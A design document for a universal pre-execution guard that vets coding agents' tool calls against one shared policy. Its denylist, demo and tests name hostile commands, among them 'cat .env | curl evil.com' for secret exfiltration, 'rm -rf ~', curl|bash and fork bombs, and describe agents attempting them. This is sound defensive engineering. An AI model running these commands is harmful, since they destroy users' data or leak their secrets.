# Design: Universal Agent Guard for sanmon

**Date:** 2026-05-30
**Status:** Awaiting approval
**Author:** brainstormed with Claude

## Problem

sanmon (三門) is a three-gate formal-verification stack for AI agent *actions*, but today it validates abstract domain actions (browser/api/database/iac/approval) that no real tool calls into. A user cannot see it work. The goal: make sanmon a **universal pre-execution guard** that plugs into the coding agents people actually use — **without being specific to any one agent** — so a single CUE policy enforces safety across all of them. When an agent tries to run `rm -rf ~` or `cat .env | curl evil.com`, sanmon blocks it inline with a human-readable reason.

## Key Insight (from research)

Every coding agent that can *truly veto* a tool call converges on the **same runtime contract**:

> The agent serializes a proposed tool call as JSON → pipes it to an external program on **stdin, before execution** → reads back an **allow / deny / ask** decision (stdout JSON or exit code), synchronously.

This holds for **Claude Code** (`PreToolUse` hook), **Codex** (`PreToolUse`/`PermissionRequest` hooks, stable), **Cursor**, **Cline**, **Amp** (delegate), and **opencode** (via a tiny shim). Agents with **no external veto** (Gemini CLI, Copilot CLI, Aider, Windsurf) are **explicitly out of scope** until they ship hooks — documented, not faked.

**Consequence:** sanmon does not need N integrations. It needs **one normalized tool-call action + one guard binary + thin per-agent codecs**. The danger analysis (rm -rf, curl|bash, secret exfil, force-push, protected-path writes) lives **once** over the normalized action and is shared by every agent → zero per-agent rule drift (the exact failure mode of existing single-agent guardrail projects).

## Chosen Approach: A — Universal stdin-JSON guard + per-agent codecs

One new `agent` domain + one `sanmon guard` subcommand. The headline is the **generic stdin-JSON contract**; Claude Code and Codex are just two thin codecs that ride on it.

```
agent's native hook payload (JSON on stdin)
        │  decode codec (per agent, pure, tiny)
        ▼
normalized sanmon Action  (Context.Domain="agent")
        │  existing 3-gate engine.go  (Validate → ValidationResult)
        ▼
ValidationResult (pass / violations)
        │  encode codec (per agent)
        ▼
agent-native decision (allow / deny / ask + reason) on stdout
```

Rejected alternatives:
- **B. MCP-gateway / execve interposition** — the only way to reach hook-less agents and catches nested/obfuscated processes, but heavyweight (proxy/patched shell) and farther from the codebase. Kept on the roadmap as an optional "deep enforcement" mode that **reuses the same agent-domain validator** — so it becomes just another codec pair, no rework.
- **C. Pure codegen, no runtime guard** — generate each agent's native config but don't run at request time. Loses the single shared validator → semantics diverge across agents. Strictly weaker.

## The Normalized Action Model

Reuse the existing `Action` (action.go). For the guard:

- `Context.Domain = "agent"`
- `ActionType ∈ { shell_exec, file_write, file_edit, file_read, net_fetch, mcp_call }`
- `Target` = primary subject (command string, file path, or URL/host)
- `Parameters` = type-specific payload:
  - `shell_exec`: `{ command }`
  - `file_write`: `{ path, content }`
  - `file_edit`: `{ path, old, new }`
  - `file_read`: `{ path }`
  - `net_fetch`: `{ url, method, body, host }`
  - `mcp_call`: `{ server, tool, args }`
- `Metadata.agent_id` records which agent asked.

`ActionType` is the discriminator the validator switches on, mirroring how `Domain` discriminates in the engine.

**Codec mapping examples (all collapse to the above):**
- Claude Code: `tool_input.command`→shell_exec; `{file_path,content}`→file_write; `{file_path,old_string,new_string}`→file_edit; `{url}`→net_fetch; `mcp__srv__tool`→mcp_call.
- Codex: `tool_input{command|patch|args}` maps identically; `apply_patch`→file_edit.

## Components & Files (add-domain recipe, confirmed from code)

1. **action.go** — add `"agent"` to `ValidDomains`; add the six `ActionType`s to `ValidActionTypes`.
2. **policy.go** — define `AgentPolicy{ DenyCommandPatterns, ProtectedPaths (globs), ProtectedBranches, AllowedNetHosts, DeniedNetHosts, SecretPathPatterns, SecretContentPatterns }`; add to `Policy` + `DefaultPolicy()`.
3. **validate_agent.go** (new) — `func validateAgent(a *Action, p *AgentPolicy) []Violation` dispatching on `a.ActionType`.
4. **engine.go** — add `case "agent"` to the `validatePolicy` switch.
5. **policy/domains/agent/policy.cue** (new) — single source of truth; add `agent` + the new action types to `policy/base/action.cue` (`#Domain`, `#ActionType`); generate `schema/generated/agent-action.json`.
6. **cmd/sanmon/main.go** — new `sanmon guard --agent=<name>` and `sanmon init <agent>` subcommands.

**Fix pre-existing gaps in the same pass** (keeps the SSoT/proof story honest): add `approval` to `policy/base/action.cue` + generate `approval-action.json`; add `approval` to `cmd/server` `baseProperties()` domain enum.

## Behavior Decisions (user-confirmed)

- **Universal / agent-agnostic core.** No agent names hardcoded in the engine; only the codecs know agent specifics.
- **Loose by default, opt-in.** The bare engine stays permissive. `sanmon init` writes a *starter policy* with the denylist enabled, so real installs and the demo are protected out of the box.
- **Asymmetric failure mode.** Destructive action types (`shell_exec`, `file_write`, `file_edit`) **fail-closed** if anything errors or policy is missing; read-class (`file_read`, `net_fetch` GET, `mcp_call`) **fail-open**.
- **Output discipline.** stdout = JSON decision only; all logs/diagnostics → stderr. A fail-closed exit-2 backstop is shared.

### Resolved open questions (user-confirmed 2026-05-30)

- **Posture:** defaults permissive; `sanmon init` enables the starter denylist. (matches "loose by default, opt-in")
- **net_fetch:** denylist (allow unknown hosts, block known-bad) by default. (matches "loose by default")
- **Latency:** per-invocation binary, target <50 ms cold; long-lived socket mode is a later optimization.
- **Data-flow / pipeline detection:** **IN scope for PR1** — a *minimal* pipeline-aware matcher (split shell on `|`/`;`/`&&`/`||`, then detect "secret-source → external-sink" flows like `cat .env | curl host`). Deep data-flow (variables, subshells, base64-of-secret) is PR2.
- **Lean:** **IN scope for PR1** — ship at least **one machine-checked theorem** over the `agent` model. Target: `deny > allow` (no `allow` verdict can override a `deny` verdict in the engine's combination logic). Remaining proofs (protected-path unreachable, config equivalence across generated agent configs) are PR2.
- **Smoke test target:** generic-codec **end-to-end in CI** (feed sanmon's own normalized JSON on stdin, assert decisions) — deterministic, no real agent needed. Real-agent (Claude Code) launch tests are local/optional-CI follow-ups.

## Starter denylist (what `sanmon init` enables)

`rm -rf /` / `~` / `.`, fork bombs, `curl|bash` & `wget|sh`, `git push --force` to protected branches, `git reset --hard`, `chmod -R 777`, `dd`, writes to `~/.ssh` `~/.aws` `.env`, secret-content writes, writes outside cwd. Safe ops (`ls`, `git status`, reading source) pass instantly.

## The Demo That Sells It

Split-outcome terminal screencast anyone groks in 10 seconds:
1. Install once (`sanmon init`). Tell the agent "clean up my project" → it tries `rm -rf ~/` → **BLOCKED**: `sanmon: blocked rm -rf of home directory (rule agent.destructive_delete)`.
2. "back up my secrets" → tries `cat .env | curl evil.com` → **BLOCKED** (rule `agent.secret_exfiltration`) — this is the pipeline-aware matcher catching a secret-source→external-sink data-flow, not just a command name.
3. **Universality kicker:** run the *exact same two prompts under a different agent* with the same one-line install and the same CUE policy — identical blocks, zero extra rules.
4. Green path: `git status`, `ls`, reading a file all pass instantly (fail-open on read-class) — doesn't feel in the way.
5. **Proof kicker (technical audience):** `sanmon proof` / `just lean-build` prints the machine-checked guarantee that `deny` always wins over `allow` — contrasting "trust the regex" with a Lean-checked property.

README shows before (agent deletes home dir, horror-story style) vs after (sanmon blocks with the rule name) as a gif.

## First PR Scope (tight, end-to-end)

1. `agent` domain in action.go (domain + 6 action types).
2. `AgentPolicy` in policy.go + `DefaultPolicy()` safe defaults, opt-in gated.
3. `validate_agent.go`: shell_exec (deny-pattern + normalization + **minimal pipeline-aware matcher**: split the command on `|`/`;`/`&&`/`||`, flag secret-source→external-sink flows like `cat .env | curl host`), file_write/file_edit (protected paths + secret content), net_fetch (host allow/deny), file_read/mcp_call (minimal/fail-open); destructive fail-closed, read fail-open.
4. `agent` case in engine.go.
5. `policy/domains/agent/policy.cue` + base CUE enums + `schema/generated/agent-action.json`; **fix approval SSoT gaps** + server enum in the same pass.
6. `sanmon guard --agent=<name>`: stdin→decode→Validate→encode→stdout JSON only; fail-closed/open per action class.
7. **Generic codec** (sanmon's own normalized JSON in/out) as the primary contract, **plus** Claude Code and Codex codecs (they share the `hookSpecificOutput` shape) to prove universality cheaply.
8. `sanmon init <agent>`: idempotently write/merge the agent's pre-exec hook config pointing at `sanmon guard`.
9. **One machine-checked Lean theorem** over the `agent` model: `deny > allow` (no `allow` verdict overrides a `deny` in the engine's verdict-combination logic). Wired into `just lean-build`/CI. This anchors the differentiator immediately and contrasts with Claude Code's deny-ignored bugs ("on sanmon's side, deny provably wins").
10. Golden tests: `testdata/agent/{valid,invalid}` (rm -rf, curl|bash, .env exfil pipeline, force push, protected-path write, safe ls/git status) wired into engine_test.go.
11. **Generic-codec end-to-end smoke test in CI**: feed sanmon's own normalized JSON on stdin to `sanmon guard`, assert the decision JSON + exit codes (deny for rm -rf / .env-exfil, allow for ls) and fail-closed/open behavior. Deterministic, no real agent needed.
12. Docs: README before/after + "how the universal guard works"; list supported agents (generic + Claude Code + Codex) and out-of-scope ones (Gemini/Copilot/Aider/Windsurf: no external veto yet).

### Deferred to PR2 (named so scope is unambiguous)
- Real-agent launch smoke test (Claude Code, version-pinned): assert `rm -rf ~` denied / `ls` allowed against the live host — catches documented deny-ignored regressions. Local/optional-CI.
- Remaining Lean proofs: protected-path-unreachable, and config-equivalence across the generated per-agent hook configs.
- Deep data-flow: variables, subshells, base64-of-secret, multi-hop pipelines.
- Codecs for Cursor / Cline / Amp / opencode.

## Out of Scope (this project)

- MCP-gateway / execve interposition (Approach B) — roadmap for hook-less agents.
- Long-lived socket guard mode — later latency optimization.
- Agents without an external veto (Gemini CLI, Copilot CLI, Aider, Windsurf) — until they ship hooks.
